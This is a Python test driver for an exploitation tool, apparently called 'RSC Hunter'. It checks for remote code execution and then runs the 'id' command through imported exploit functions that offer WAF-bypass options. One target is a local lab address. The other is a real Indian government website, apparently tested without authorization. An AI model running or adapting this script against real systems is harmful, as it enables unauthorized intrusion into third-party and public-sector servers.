#!/usr/bin/env python3
"""
Quick test script for modularized RSC Hunter
Tests against two known targets
"""

import sys
from lib.utils import Colors, UrlParser
from lib.validators import validateRCE
from lib.exploits import executeRemoteCommand
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def create_session():
    """Create session with retry logic"""
    session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    return session

def test_target(url: str, session: requests.Session):
    """Test a single target"""
    print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}Testing: {url}{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
    
    # Test RCE validation
    print(f"{Colors.YELLOW}[1] Testing RCE Validation...{Colors.RESET}")
    validation = validateRCE(url, session, windowsMode=False, wafBypass=False, debug=True)
    if validation:
        print(f"{Colors.GREEN}✓ RCE Validated!{Colors.RESET}\n")
    else:
        print(f"{Colors.YELLOW}⚠ Validation failed (will try exploitation anyway){Colors.RESET}\n")
    
    # Test exploitation
    print(f"{Colors.YELLOW}[2] Testing Exploitation (id command)...{Colors.RESET}")
    result = executeRemoteCommand(
        target=url,
        cmd="id",
        session=session,
        windowsMode=False,
        wafBypass=False,
        wafBypassSize=128,
        vercelWafBypass=False,
        skipValidation=True,  # Skip since we already validated above
        debug=True
    )
    
    if result:
        print(f"\n{Colors.GREEN}{'='*70}{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}✓ EXPLOITATION SUCCESSFUL!{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
        print(f"{Colors.WHITE}Output: {result}{Colors.RESET}")
    else:
        print(f"\n{Colors.RED}{'='*70}{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}✗ EXPLOITATION FAILED{Colors.RESET}")
        print(f"{Colors.RED}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}This may indicate WAF/firewall protection{Colors.RESET}")

def main():
    """Main test function"""
    print(f"""
{Colors.BOLD}{Colors.CYAN}RSC Hunter - Modular Test Suite{Colors.RESET}
{Colors.CYAN}Testing against known targets{Colors.RESET}
    """)
    
    targets = [
        "http://192.168.0.58:3000",  # Known vulnerable (clean)
        "https://rajyasabha.nic.in"  # Maybe vulnerable (WAF protected)
    ]
    
    session = create_session()
    
    for target in targets:
        try:
            test_target(target, session)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Test interrupted by user{Colors.RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}Error testing {target}: {e}{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}Test Complete!{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")

if __name__ == "__main__":
    main()
